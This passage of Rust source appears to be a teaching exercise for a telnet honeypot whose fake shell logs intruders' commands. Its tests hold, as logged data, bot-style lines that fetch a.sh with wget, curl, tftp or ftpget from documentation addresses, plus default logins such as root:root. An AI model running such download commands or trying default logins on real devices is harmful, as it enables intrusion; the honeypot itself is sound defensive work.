            (TelnetState::AfterVerb, _) => (TelnetState::Text, None),
            (TelnetState::InLongMessage, IAC) => (TelnetState::InLongMessageAfterIac, None),
            (TelnetState::InLongMessage, _) => (TelnetState::InLongMessage, None),
            (TelnetState::InLongMessageAfterIac, SE) => (TelnetState::Text, None),
            (TelnetState::InLongMessageAfterIac, _) => (TelnetState::InLongMessage, None),
        };
        self.state = next;
        keep
    }
}

impl Default for TelnetDecoder {
    fn default() -> TelnetDecoder {
        TelnetDecoder::new()
    }
}

/// Wraps a connection, so that whatever reads from it only ever sees text.
///
/// The negotiation isn't thrown away. Attackers have used it to carry exploits, with the payload
/// inside a longer message rather than in anything typed at a prompt, so it's kept for the log.
pub struct TelnetFilter<R> {
    inner: R,
    decoder: TelnetDecoder,
    negotiation: Vec<u8>,
}

impl<R> TelnetFilter<R> {
    pub fn new(inner: R) -> TelnetFilter<R> {
        TelnetFilter {
            inner,
            decoder: TelnetDecoder::new(),
            negotiation: Vec::new(),
        }
    }

    /// What this filter is wrapped around.
    pub fn inner(&self) -> &R {
        &self.inner
    }

    /// The negotiation seen so far, as hex, so it stays byte for byte and can't affect a terminal.
    pub fn negotiation_as_hex(&self) -> String {
        self.negotiation
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect()
    }
}

// This is a worked example, not an exercise. It's the same trick as `Read for TimeLimited` in Stage
// 4, and it means `read_answer`, `read_command` and `BufReader` all work without changing.
//
// Watch out for the loop. If everything read was negotiation, there's no text to hand back yet.
// Returning `Ok(0)` would mean "end of input", which would end the visit, so it reads again. That
// can't run forever, because the reader underneath gives `Ok(0)` when the visit's deadline comes.
impl<R: Read> Read for TelnetFilter<R> {
    fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
        loop {
            let count = self.inner.read(buffer)?;
            if count == 0 {
                return Ok(0);
            }
            let mut kept = 0;
            for position in 0..count {
                let byte = buffer[position];
                match self.decoder.feed(byte) {
                    Some(text) => {
                        buffer[kept] = text;
                        kept += 1;
                    }
                    None if self.negotiation.len() < MAX_TELNET_BYTES_KEPT => {
                        self.negotiation.push(byte)
                    }
                    None => {}
                }
            }
            if kept > 0 {
                return Ok(kept);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
//
// You don't need to change anything below, but do read the tests: they show exactly how your
// code is going to be used.
//
// The logins, commands and addresses here are made up. Connections only ever use localhost,
// and 203.0.113.x and example.com are reserved for documentation, so they don't belong to
// anyone. Nothing here ever connects to them. Logs go in throwaway folders.

#[cfg(test)]
mod tests {
    use super::*;
    use crate::deploy::{code_only, forbidden_uses};
    use crate::log_files::{DailyLog, dated_log_files, screen_line, today};
    use crate::login::listen_on_localhost;
    use crate::server::{Limits, Shared, WriteLimited, run_shell_visit, serve_next};
    use std::env;
    use std::fs::{self, DirBuilder};
    use std::io::BufReader;
    use std::net::{TcpListener, TcpStream};
    use std::os::unix::fs::DirBuilderExt;
    use std::path::PathBuf;
    use std::thread;
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

    const IP_A: IpAddr = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 1));
    const IP_B: IpAddr = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 2));
    const LOCALHOST: IpAddr = IpAddr::V4(Ipv4Addr::LOCALHOST);

    const SHORT_LIMIT: Duration = Duration::from_millis(200);
    const LONG_LIMIT: Duration = Duration::from_secs(20);
    const REJECTED: &str = "login: Password: Login incorrect\r\n";
    const LOGGED_IN: &str = "login: Password: # ";

    // The decoder only meets this one inside the range `WILL..=DONT`, so only the tests name it.
    const WONT: u8 = 252;

    // Words that must never come back. This is what a visitor's own text looks like.
    const MARKER: &str = "XYZZY";

    // A folder that belongs to one test, deleted when the test ends, as in Stage 3.
    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(test_name: &str) -> TestDir {
            let name = format!("honeypot-shell-test-{}-{test_name}", std::process::id());
            let path = env::temp_dir().join(name);
            let _ = fs::remove_dir_all(&path);
            DirBuilder::new().mode(0o700).create(&path).unwrap();
            TestDir { path }
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }

    // A pretend visitor who has gone quiet, as in Stage 2.
    struct GoesQuiet;

    impl Read for GoesQuiet {
        fn read(&mut self, _buffer: &mut [u8]) -> io::Result<usize> {
            Err(io::ErrorKind::WouldBlock.into())
        }
    }

    // A pretend connection that accepts a few writes, then acts as if the visitor hung up.
    struct HangsUpAfter {
        writes_left: u32,
    }

    impl Write for HangsUpAfter {
        fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
            if self.writes_left == 0 {
                return Err(io::ErrorKind::BrokenPipe.into());
            }
            self.writes_left -= 1;
            Ok(bytes.len())
        }

        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    fn as_text(bytes: &[u8]) -> String {
        String::from_utf8_lossy(bytes).to_string()
    }

    fn day_one() -> NaiveDate {
        NaiveDate::from_ymd_opt(2026, 10, 31).unwrap()
    }

    fn day_two() -> NaiveDate {
        NaiveDate::from_ymd_opt(2026, 11, 1).unwrap()
    }

    // Built directly, so tests for later exercises don't depend on Exercise 1.
    fn sample_list() -> Credentials {
        Credentials {
            pairs: vec![
                ("root".to_string(), "root".to_string()),
                ("admin".to_string(), "admin".to_string()),
                ("guest".to_string(), String::new()),
            ],
        }
    }

    fn reply_for(key: &str) -> &'static str {
        CANNED.iter().find(|(name, _)| *name == key).unwrap().1
    }

    fn failure_of(tool: &str) -> &'static str {
        DOWNLOAD_FAILURES
            .iter()
            .find(|(name, _)| *name == tool)
            .unwrap()
            .1
    }

    // Runs the shell on what someone typed. Gives back the session and what the shell sent.
    fn session_for(typed: &str) -> (ShellSession, String) {
        let mut session = ShellSession::new();
        let mut sent = Vec::new();
        session.run(&mut typed.as_bytes(), &mut sent).unwrap();
        (session, as_text(&sent))
    }

    fn blank_visit() -> Visit {
        Visit::new(UNIX_EPOCH + Duration::from_secs(1000), LOCALHOST)
    }

    // Runs the whole login on what someone typed. Gives back the visit and what was sent.
    fn visit_for(typed: &str) -> (Visit, String) {
        let mut visit = blank_visit();
        let mut sent = Vec::new();
        visit.run_login_or_shell(&mut typed.as_bytes(), &mut sent, &sample_list());
        (visit, as_text(&sent))
    }

    fn session_of(visit: &Visit) -> &ShellSession {
        visit.shell.as_ref().unwrap()
    }

    // A real connection on localhost: the visitor's end, then the server's end.
    fn connected_pair() -> (TcpStream, TcpStream) {
        let listener = listen_on_localhost(0).unwrap();
        let visitor = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        visitor
            .set_read_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        let (server, _) = listener.accept().unwrap();
        (visitor, server)
    }

    fn visitor_of(listener: &TcpListener) -> TcpStream {
        let visitor = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        visitor
            .set_read_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        visitor
    }

    // Reads until the server closes the connection.
    fn reply_to(visitor: &mut TcpStream) -> String {
        let mut reply = Vec::new();
        let _ = visitor.read_to_end(&mut reply);
        as_text(&reply)
    }

    // Reads until this text shows up, the way a client waits for a prompt.
    fn wait_for(visitor: &mut TcpStream, text: &str) {
        let mut seen = Vec::new();
        let mut byte = [0];
        while !as_text(&seen).ends_with(text) {
            assert_eq!(visitor.read(&mut byte).unwrap(), 1, "connection closed");
            seen.push(byte[0]);
        }
    }

    // What a visitor sees from a server with the shell on: the opening, and then the text.
    fn with_opening(text: &str) -> String {
        format!("{}{text}", as_text(TELNET_OPENING))
    }

    // Runs bytes through a fresh decoder, and gives back the text it kept.
    fn decoded(bytes: &[u8]) -> Vec<u8> {
        let mut decoder = TelnetDecoder::new();
        bytes
            .iter()
            .filter_map(|byte| decoder.feed(*byte))
            .collect()
    }

    // How a client answers the opening: it agrees or refuses, and sends its window size.
    const ANSWER_TO_OPENING: &[u8] = &[
        255, 252, 1, 255, 251, 31, 255, 250, 31, 0, 80, 0, 24, 255, 240, 255, 253, 1, 255, 253, 3,
    ];

    // A pretend connection that hands over one byte per read, so every message gets cut up.
    struct OneByteAtATime<'a> {
        bytes: &'a [u8],
    }

    impl Read for OneByteAtATime<'_> {
        fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
            match self.bytes.split_first() {
                Some((first, rest)) if !buffer.is_empty() => {
                    buffer[0] = *first;
                    self.bytes = rest;
                    Ok(1)
                }
                _ => Ok(0),
            }
        }
    }

    // Runs a whole login through the filter, without a real connection.
    fn visit_through_filter(typed: &[u8]) -> (Visit, String) {
        let mut visit = blank_visit();
        let mut reader = BufReader::new(TelnetFilter::new(typed));
        visit.run_login_or_shell(&mut reader, &mut Vec::new(), &sample_list());
        let hex = reader.get_ref().negotiation_as_hex();
        (visit, hex)
    }

    fn roomy_budget() -> ShellBudget {
        ShellBudget::new(1_000_000, 1_000_000, 100)
    }

    fn server_without_shell(dir: &TestDir) -> Shared {
        let log = DailyLog::open(&dir.path, today()).unwrap();
        Shared::new(log, Limits::new(10, 10), 1_000_000, LONG_LIMIT).unwrap()
    }

    fn server_with_shell(dir: &TestDir, limits: Limits, budget: ShellBudget) -> Shared {
        let log = DailyLog::open(&dir.path, today()).unwrap();
        Shared::new(log, limits, 1_000_000, LONG_LIMIT)
            .unwrap()
            .with_fake_shell(sample_list(), budget)
    }

    fn logged_visits(dir: &TestDir) -> Vec<serde_json::Value> {
        let mut visits = Vec::new();
        for (path, _) in dated_log_files(&dir.path).unwrap() {
            for line in fs::read_to_string(path).unwrap().lines() {
                visits.push(serde_json::from_str(line).unwrap());
            }
        }
        visits
    }

    // The server handles visitors on their own threads, so a missing piece would only show up
    // here as a strange failure. This tries each piece on the test's own thread first, so you
    // see "not yet implemented" instead.
    fn check_the_pieces_first() {
        visit_for("root\nroot\nuname\nexit\n");
        assert!(roomy_budget().has_room(IP_A, day_one()));
        assert_eq!(decoded(b"x"), b"x");
        let (_visitor, server) = connected_pair();
        let mut writer = WriteLimited::new(&server, Instant::now() + LONG_LIMIT);
        writer.write_all(b"x").unwrap();
    }

    // -----------------------------------------------------------------------
    // Guards: these already pass, and they should never stop passing.
    // -----------------------------------------------------------------------

    // Everything in this file works on text and on whatever reader and writer it's handed. If
    // it could reach the files, the network or other programs, "nothing is ever run" would stop
    // being something you can check by reading one list.
    #[test]
    fn guard_this_file_cannot_touch_the_system() {
        let source = fs::read_to_string("src/fake_shell.rs").unwrap();
        let never_here = [
            "std::fs",
            "fs::",
            "std::process",
            "process::",
            "Command::",
            "std::env",
            "std::os",
            "std::thread",
            "TcpStream",
            "TcpListener",
            "UdpSocket",
            "File::",
            "OpenOptions",
            "include_",
        ];
        let found = forbidden_uses(code_only(&source), &never_here);
        assert!(found.is_empty(), "these lines break the rules: {found:#?}");
    }

    // A crate that can make web requests would be the easiest way to break safety rule 2 by
    // accident, so adding any crate at all has to be a decision someone makes on purpose.
    #[test]
    fn guard_no_new_crates() {
        let manifest = fs::read_to_string("Cargo.toml").unwrap();
        let (_, dependencies) = manifest.split_once("[dependencies]").unwrap();
        let mut names: Vec<&str> = dependencies
            .lines()
            .filter_map(|line| line.split_once('='))
            .map(|(name, _)| name.trim())
            .collect();
        names.sort();
        assert_eq!(names, ["chrono", "serde", "serde_json"]);
    }

    #[test]
    fn guard_without_a_list_nobody_gets_in() {
        let dir = TestDir::new("guard-no-list");
        let shared = server_without_shell(&dir);
        let listener = listen_on_localhost(0).unwrap();

        let mut visitor = visitor_of(&listener);
        visitor.write_all(b"root\nroot\nuname -a\n").unwrap();
        serve_next(&listener, &shared).unwrap();

        // Exactly what the login has always said, with no telnet opening in front of it.
        assert_eq!(reply_to(&mut visitor), REJECTED);
        let visits = logged_visits(&dir);
        assert_eq!(visits[0]["outcome"], "attempted");
        assert!(visits[0].get("shell").is_none());
        assert!(visits[0].get("telnet").is_none());
    }

    #[test]
    fn guard_a_visit_without_a_session_has_no_shell_field() {
        let line = blank_visit().to_json_line().unwrap();
        assert_eq!(
            line,
            r#"{"time":1000,"source_ip":"127.0.0.1","outcome":"left","username":null,"password":null}"#
        );
    }

    #[test]
    fn guard_a_session_is_written_at_the_end_of_the_line() {
        let mut visit = blank_visit();
        visit.outcome = Outcome::LoggedIn;
        visit.username = Some("root".to_string());
        visit.password = Some("root".to_string());
        visit.shell = Some(ShellSession {
            ended: SessionEnd::TimedOut,
            commands: vec!["wget http://example.com/a.sh".to_string()],
            urls: vec!["http://example.com/a.sh".to_string()],
            reply_bytes: 9,
            stored_bytes: 51,
        });
        assert_eq!(
            visit.to_json_line().unwrap(),
            r#"{"time":1000,"source_ip":"127.0.0.1","outcome":"logged_in","username":"root","password":"root","shell":{"ended":"timed_out","commands":["wget http://example.com/a.sh"],"urls":["http://example.com/a.sh"],"reply_bytes":9}}"#
        );
    }

    #[test]
    fn guard_negotiation_goes_before_the_session_in_the_log_line() {
        let mut visit = blank_visit();
        visit.telnet = Some("fffb1f".to_string());
        assert_eq!(
            visit.to_json_line().unwrap(),
            r#"{"time":1000,"source_ip":"127.0.0.1","outcome":"left","username":null,"password":null,"telnet":"fffb1f"}"#
        );
    }

    // A bot that waits for the server to speak telnet looks at the very first byte.
    #[test]
    fn guard_the_opening_is_a_row_of_three_byte_requests() {
        assert_eq!(TELNET_OPENING.len() % 3, 0);
        for request in TELNET_OPENING.chunks(3) {
            assert_eq!(request[0], IAC);
            assert!([DO, WILL].contains(&request[1]));
        }
    }

    #[test]
    fn guard_the_screen_never_shows_commands_addresses_or_passwords() {
        let mut visit = blank_visit();
        visit.source_ip = IP_A;
        visit.outcome = Outcome::LoggedIn;
        visit.username = Some("root".to_string());
        visit.password = Some("hunter2".to_string());
        visit.shell = Some(ShellSession {
            ended: SessionEnd::Exit,
            commands: vec!["echo secret123 | passwd".to_string()],
            urls: vec!["http://example.com/a.sh".to_string()],
            reply_bytes: 9,
            stored_bytes: 45,
        });

        let line = screen_line(&visit);

        assert_eq!(
            line,
            "1970-01-01 LoggedIn from 203.0.x.x user=root password=(hidden) shell: ended=Exit commands=1 urls=1 sent=9"
        );
        for secret in ["hunter2", "secret123", "example.com", "203.0.113.1"] {
            assert!(!line.contains(secret), "{secret}");
        }
    }

    // Each reply has to finish its line, so the prompt that follows starts on a fresh one.
    #[test]
    fn guard_every_reply_finishes_its_line() {
        let replies = CANNED
            .iter()
            .chain(DOWNLOAD_FAILURES)
            .map(|(_, reply)| *reply)
            .chain([NOT_FOUND, NETWORK_FAILURE]);
        for reply in replies {
            assert!(reply.is_empty() || reply.ends_with("\r\n"), "{reply:?}");
        }
    }

    // The first match wins, so a key placed after a shorter version of itself could never match.
    #[test]
    fn guard_no_key_hides_a_later_key() {
        for (position, (earlier, _)) in CANNED.iter().enumerate() {
            for (later, _) in &CANNED[position + 1..] {
                assert!(!matches_key(later, earlier), "{earlier} hides {later}");
            }
        }
    }

    // Exercise 13 gives one exact command its own reply. Any other `echo` gets the same blank line,
    // so that one entry can't turn into a way of getting text sent back.
    #[test]
    fn guard_echo_never_repeats_what_was_typed() {
        for word in [
            "ANYTHING_ELSE",
            MARKER,
            "SHELL_TEST2",
            "XSHELL_TEST",
            "shell_test",
        ] {
            let typed = format!("echo {word}");
            let reply = canned_reply(&typed);
            assert_eq!(reply, reply_for("echo"), "{typed}");
            assert!(!reply.contains(word), "{typed}");

            let (_, sent) = session_for(&format!("{typed}\nexit\n"));
            assert!(!sent.contains(word), "{typed}");
        }
    }

    // Extra words still match a key, as they do for every command, but they never come back.
    #[test]
    fn guard_words_after_the_checked_word_are_never_sent_back() {
        let (_, sent) = session_for("echo SHELL_TEST ANYTHING_ELSE\nexit\n");
        assert!(!sent.contains("ANYTHING_ELSE"));
    }

    // A visitor's text only lasts as long as their connection. If a reply could ever borrow from
    // it, or the list could hold anything but text built into the program, this stops compiling,
    // and every test fails with it.
    #[test]
    fn guard_replies_are_always_text_built_into_the_program() {
        let list: &'static [(&'static str, &'static str)] = CANNED;
        assert!(!list.is_empty());

        let reply: &'static str = {
            let typed = String::from("echo ANYTHING_ELSE");
            canned_reply(&typed)
        };
        assert!(!reply.contains("ANYTHING_ELSE"));
    }

    #[test]
    fn guard_a_budget_counts_what_is_spent() {
        let mut budget = ShellBudget::new(100, 1000, 10);
        budget.spend(IP_A, day_one(), 30);
        budget.spend(IP_A, day_one(), 40);
        budget.spend(IP_B, day_one(), 5);
        assert_eq!(budget.per_ip.get(&IP_A), Some(&70));
        assert_eq!(budget.total, 75);
    }

    #[test]
    fn guard_a_budget_cannot_track_more_addresses_than_its_limit() {
        let mut budget = ShellBudget::new(100, 1000, 1);
        budget.spend(IP_A, day_one(), 1);
        budget.spend(IP_B, day_one(), 1);
        assert_eq!(budget.per_ip.len(), 1);
        assert_eq!(budget.total, 2);
    }

    // -----------------------------------------------------------------------
    // The exercises
    // -----------------------------------------------------------------------

    #[test]
    fn ex1_reads_logins() {
        let list = Credentials::parse("root:root\nadmin:1234\n").unwrap();
        assert_eq!(
            list.pairs,
            [
                ("root".to_string(), "root".to_string()),
                ("admin".to_string(), "1234".to_string()),
            ]
        );
        assert_eq!(list.count(), 2);
    }

    #[test]
    fn ex1_skips_blank_lines_and_comments() {
        let list = Credentials::parse("# defaults\n\n   \nroot:root\n  # more\n").unwrap();
        assert_eq!(list.count(), 1);
    }

    #[test]
    fn ex1_a_password_can_be_empty() {
        let list = Credentials::parse("admin:\n").unwrap();
        assert_eq!(list.pairs, [("admin".to_string(), String::new())]);
    }

    #[test]
    fn ex1_a_password_can_contain_a_colon_or_a_space() {
        let list = Credentials::parse("a:b:c\nd:e f\n").unwrap();
        assert_eq!(list.pairs[0].1, "b:c");
        assert_eq!(list.pairs[1].1, "e f");
    }

    // A space at the end of a line is part of the password, so the line has to be split as it
    // is, not after trimming it.
    #[test]
    fn ex1_a_space_at_the_end_of_a_password_is_kept() {
        let list = Credentials::parse("root:abc \n").unwrap();
        assert_eq!(list.pairs[0].1, "abc ");
    }

    #[test]
    fn ex1_handles_windows_line_endings() {
        let list = Credentials::parse("root:root\r\n").unwrap();
        assert_eq!(list.pairs[0].1, "root");
    }

    #[test]
    fn ex1_a_line_with_no_colon_is_an_error_that_names_the_line() {
        let error = Credentials::parse("root:root\n# fine\nnocolon\n").unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::InvalidInput);
        assert!(error.to_string().contains("line 3"), "{error}");
    }

    #[test]
    fn ex1_an_empty_username_is_an_error() {
        let error = Credentials::parse(":password\n").unwrap_err();
        assert!(error.to_string().contains("line 1"), "{error}");
    }

    #[test]
    fn ex1_a_list_with_no_logins_is_an_error() {
        for text in ["", "\n\n", "# only a comment\n"] {
            assert!(Credentials::parse(text).is_err(), "{text:?}");
        }
    }

    #[test]
    fn ex1_the_list_in_the_repo_is_valid() {
        let text = fs::read_to_string("deploy/host/credentials.txt").unwrap();
        let list = Credentials::parse(&text).unwrap();
        assert!(list.accepts("root", "root"));
        assert!(!list.accepts("root", "not-on-the-list"));
    }

    #[test]
    fn ex2_accepts_a_login_on_the_list() {
        assert!(sample_list().accepts("root", "root"));
        assert!(sample_list().accepts("guest", ""));
    }

    #[test]
    fn ex2_rejects_anything_else() {
        let list = sample_list();
        for (username, password) in [
            ("root", "wrong"),
            ("nobody", "root"),
            ("", ""),
            ("ROOT", "root"),
            ("root", ""),
            ("root ", "root"),
        ] {
            assert!(!list.accepts(username, password), "{username}:{password}");
        }
    }

    #[test]
    fn ex2_both_have_to_match_the_same_line() {
        assert!(!sample_list().accepts("root", "admin"));
        assert!(!sample_list().accepts("admin", "root"));
    }

    #[test]
    fn ex3_a_single_command_stays_whole() {
        assert_eq!(split_commands("uname -a"), ["uname -a"]);
    }

    #[test]
    fn ex3_splits_on_each_separator() {
        assert_eq!(
            split_commands("a; b && c | d || e"),
            ["a", "b", "c", "d", "e"]
        );
    }

    #[test]
    fn ex3_works_without_spaces() {
        assert_eq!(split_commands("a;b&&c|d"), ["a", "b", "c", "d"]);
    }

    #[test]
    fn ex3_trims_and_drops_empty_pieces() {
        assert_eq!(split_commands("  a ;; ; b\r\n"), ["a", "b"]);
        assert!(split_commands("").is_empty());
        assert!(split_commands(" ; \n").is_empty());
    }

    #[test]
    fn ex3_a_single_ampersand_stays_in_place() {
        assert_eq!(
            split_commands("wget http://example.com/a?x=1&y=2"),
            ["wget http://example.com/a?x=1&y=2"]
        );
    }

    #[test]
    fn ex3_survives_text_that_is_not_ascii() {
        assert_eq!(split_commands("é; ü\u{1b}[2J"), ["é", "ü\u{1b}[2J"]);
    }

    #[test]
    fn ex4_finds_a_url_in_a_download() {
        assert_eq!(
            find_urls("wget http://203.0.113.9/a.sh"),
            ["http://203.0.113.9/a.sh"]
        );
        assert_eq!(
            find_urls("curl -O https://example.com/a.sh"),
            ["https://example.com/a.sh"]
        );
    }

    #[test]
    fn ex4_finds_a_url_in_any_command() {
        assert_eq!(
            find_urls("python3 fetch.py ftp://example.com/a.sh"),
            ["ftp://example.com/a.sh"]
        );
    }

    #[test]
    fn ex4_finds_every_url() {
        assert_eq!(
            find_urls("wget http://example.com/a http://example.com/b"),
            ["http://example.com/a", "http://example.com/b"]
        );
    }

    #[test]
    fn ex4_keeps_the_query_string() {
        assert_eq!(
            find_urls("wget http://example.com/a?x=1&y=2"),
            ["http://example.com/a?x=1&y=2"]
        );
    }

    #[test]
    fn ex4_removes_quotes_and_brackets() {
        for part in [
            "curl \"http://example.com/a\"",
            "sh -c 'wget http://example.com/a'",
            "echo $(curl http://example.com/a)",
            "echo `curl http://example.com/a`",
            "wget http://example.com/a>/dev/null",
        ] {
            assert_eq!(find_urls(part), ["http://example.com/a"], "{part}");
        }
    }

    #[test]
    fn ex4_finds_an_address_with_no_scheme_in_a_download() {
        assert_eq!(
            find_urls("wget 203.0.113.9/a.sh -O /tmp/a.sh"),
            ["203.0.113.9/a.sh"]
        );
        assert_eq!(
            find_urls("wget example.com/a.sh -O ./a.sh"),
            ["example.com/a.sh"]
        );
        assert_eq!(
            find_urls("wget 203.0.113.9:8080/a.sh"),
            ["203.0.113.9:8080/a.sh"]
        );
    }

    #[test]
    fn ex4_finds_a_bare_address_for_tftp_and_ftpget() {
        assert_eq!(
            find_urls("tftp -g -l a.sh -r a.sh 203.0.113.9"),
            ["203.0.113.9"]
        );
        assert_eq!(
            find_urls("ftpget -v -u anon -p anon -P 21 203.0.113.9 a.sh a.sh"),
            ["203.0.113.9"]
        );
    }

    #[test]
    fn ex4_ignores_addresses_outside_a_download() {
        assert!(find_urls("ping 203.0.113.9").is_empty());
        assert!(find_urls("cat example.com/a.sh").is_empty());
    }

    #[test]
    fn ex4_ignores_files_and_flags() {
        assert!(find_urls("cd /tmp").is_empty());
        assert!(find_urls("wget --output=a.sh/b -O /tmp/a.sh ./b.sh").is_empty());
        assert!(find_urls("").is_empty());
    }

    #[test]
    fn ex5_reports_the_failure_for_each_tool() {
        for (part, tool) in [
            ("wget http://example.com/a.sh", "wget"),
            ("curl -O http://example.com/a.sh", "curl"),
            ("tftp -g -r a.sh 203.0.113.9", "tftp"),
            ("ftpget 203.0.113.9 a.sh a.sh", "ftpget"),
        ] {
            assert_eq!(download_failure(part), Some(failure_of(tool)), "{part}");
        }
    }

    #[test]
    fn ex5_finds_a_tool_anywhere_in_the_command() {
        for part in [
            "/usr/bin/wget x",
            "/bin/busybox wget x",
            "sh -c 'wget x'",
            "wget",
        ] {
            assert_eq!(download_failure(part), Some(failure_of("wget")), "{part}");
        }
    }

    #[test]
    fn ex5_a_url_in_any_other_command_fails_too() {
        assert_eq!(
            download_failure("python3 fetch.py http://example.com/a.sh"),
            Some(NETWORK_FAILURE)
        );
    }

    #[test]
    fn ex5_anything_else_is_not_a_download() {
        for part in ["ls", "cd /tmp", "ping 203.0.113.9", ""] {
            assert_eq!(download_failure(part), None, "{part}");
        }
    }

    #[test]
    fn ex6_knows_common_commands() {
        for key in [
            "uname -a",
            "uname",
            "whoami",
            "id",
            "ls",
            "cat /proc/cpuinfo",
        ] {
            assert_eq!(canned_reply(key), reply_for(key), "{key}");
        }
    }

    #[test]
    fn ex6_a_longer_key_gets_its_own_reply() {
        assert_ne!(canned_reply("uname -a"), canned_reply("uname"));
        assert_ne!(
            canned_reply("cat /proc/cpuinfo"),
            canned_reply("cat /etc/passwd")
        );
    }

    #[test]
    fn ex6_extra_words_still_match() {
        assert_eq!(canned_reply("ls -la /tmp"), reply_for("ls"));
        assert_eq!(canned_reply("cat /etc/passwd"), reply_for("cat"));
        assert_eq!(canned_reply("cd /tmp"), "");
    }

    #[test]
    fn ex6_ignores_the_path_to_a_command() {
        assert_eq!(canned_reply("/bin/uname -a"), reply_for("uname -a"));
        assert_eq!(canned_reply("/bin/busybox ABC"), reply_for("busybox"));
    }

    #[test]
    fn ex6_a_key_has_to_be_a_whole_word() {
        assert_eq!(canned_reply("lsof"), NOT_FOUND);
        assert_eq!(canned_reply("identify"), NOT_FOUND);
    }

    #[test]
    fn ex6_anything_else_is_not_found() {
        assert_eq!(canned_reply("./a.sh"), NOT_FOUND);
        assert_eq!(canned_reply("nonsense"), NOT_FOUND);
    }

    #[test]
    fn ex6_a_download_comes_before_everything_else() {
        assert_eq!(canned_reply("cat http://example.com/a"), NETWORK_FAILURE);
        assert_eq!(canned_reply("/bin/busybox wget x"), failure_of("wget"));
    }

    #[test]
    fn ex6_never_repeats_what_was_typed() {
        for part in [
            MARKER.to_string(),
            format!("echo {MARKER}"),
            format!("cat {MARKER}"),
            format!("busybox {MARKER}"),
            format!("wget http://{MARKER}/a.sh"),
            format!("python3 http://{MARKER}/a.sh"),
        ] {
            assert!(!canned_reply(&part).contains(MARKER), "{part}");
        }
    }

    #[test]
    fn ex6_survives_hostile_text() {
        for part in ["", "/", "///", "é/ü x", "\u{1b}[2J", "/é", "\u{0}"] {
            canned_reply(part);
        }
    }

    #[test]
    fn ex7_cleans_and_stores_a_line() {
        let mut session = ShellSession::new();
        assert!(session.record("uname -a\r\n"));
        assert_eq!(session.commands, ["uname -a"]);
        assert!(session.urls.is_empty());
        assert_eq!(session.stored_bytes, "uname -a".len());
    }

    #[test]
    fn ex7_escapes_hostile_text() {
        let mut session = ShellSession::new();
        assert!(session.record("echo \u{1b}[2J\n"));
        assert_eq!(session.commands, [r"echo \u{1b}[2J"]);
    }

    #[test]
    fn ex7_stores_the_addresses_from_every_part() {
        let mut session = ShellSession::new();
        assert!(session.record("cd /tmp; wget http://example.com/a; tftp -r b 203.0.113.9\n"));
        assert_eq!(session.urls, ["http://example.com/a", "203.0.113.9"]);
        assert_eq!(session.commands.len(), 1);
    }

    #[test]
    fn ex7_cleans_the_addresses_too() {
        let mut session = ShellSession::new();
        assert!(session.record("wget http://example.com/\u{1b}[2J\n"));
        assert_eq!(session.urls, [r"http://example.com/\u{1b}[2J"]);
    }

    #[test]
    fn ex7_counts_the_addresses_as_stored() {
        let mut session = ShellSession::new();
        session.record("wget http://e.com/a\n");
        let expected = "wget http://e.com/a".len() + "http://e.com/a".len();
        assert_eq!(session.stored_bytes, expected);
    }

    #[test]
    fn ex7_stops_at_the_limit_on_commands() {
        let mut session = ShellSession::new();
        for _ in 0..MAX_COMMANDS_PER_SESSION {
            assert!(session.record("\n"));
        }
        assert!(!session.record("id\n"));
        assert_eq!(session.commands.len(), MAX_COMMANDS_PER_SESSION);
    }

    #[test]
    fn ex7_stops_at_the_limit_on_bytes() {
        let mut session = ShellSession::new();
        let line = "a".repeat(2000);
        while session.record(&line) {
            assert!(session.commands.len() <= MAX_COMMANDS_PER_SESSION);
        }
        assert!(session.stored_bytes <= MAX_STORED_BYTES_PER_SESSION);
        assert!(session.stored_bytes + 2000 > MAX_STORED_BYTES_PER_SESSION);
    }

    #[test]
    fn ex7_a_line_with_no_room_is_not_stored_at_all() {
        let mut session = ShellSession::new();
        session.stored_bytes = MAX_STORED_BYTES_PER_SESSION;
        assert!(!session.record("wget http://example.com/a\n"));
        assert!(session.commands.is_empty());
        assert!(session.urls.is_empty());
    }

    #[test]
    fn ex7_hostile_text_cannot_make_the_log_line_huge() {
        let mut session = ShellSession::new();
        let line = format!("wget http://e.com/{}\n", "\u{1b}".repeat(2000));
        while session.record(&line) {
            assert!(session.commands.len() <= MAX_COMMANDS_PER_SESSION);
        }
        let json = serde_json::to_string(&session).unwrap();
        assert!(
            json.len() < 2 * MAX_STORED_BYTES_PER_SESSION,
            "{}",
            json.len()
        );
    }

    #[test]
    fn ex8_prompts_replies_and_prompts_again() {
        let (session, sent) = session_for("whoami\nexit\n");
        assert_eq!(sent, format!("# {}# ", reply_for("whoami")));
        assert_eq!(session.commands, ["whoami", "exit"]);
        assert_eq!(session.ended, SessionEnd::Exit);
    }

    #[test]
    fn ex8_counts_what_it_sent() {
        let (session, sent) = session_for("whoami\nexit\n");
        assert_eq!(session.reply_bytes, sent.len());
    }

    #[test]
    fn ex8_replies_to_each_part_in_order() {
        let (_, sent) = session_for("whoami; nonsense; id\nexit\n");
        let expected = format!("# {}{NOT_FOUND}{}# ", reply_for("whoami"), reply_for("id"));
        assert_eq!(sent, expected);
    }

    #[test]
    fn ex8_a_blank_line_just_prompts_again() {
        let (session, sent) = session_for("\nexit\n");
        assert_eq!(sent, "# # ");
        assert_eq!(session.commands, ["", "exit"]);
    }

    #[test]
    fn ex8_exit_and_logout_end_the_session() {
        for line in ["exit\n", "exit 0\n", "logout\n", "/bin/exit\n"] {
            let (session, sent) = session_for(line);
            assert_eq!(session.ended, SessionEnd::Exit, "{line}");
            assert_eq!(sent, PROMPT, "{line}");
        }
    }

    #[test]
    fn ex8_nothing_runs_after_exit() {
        let (session, sent) = session_for("whoami; exit; id\nuname\n");
        assert_eq!(sent, format!("# {}", reply_for("whoami")));
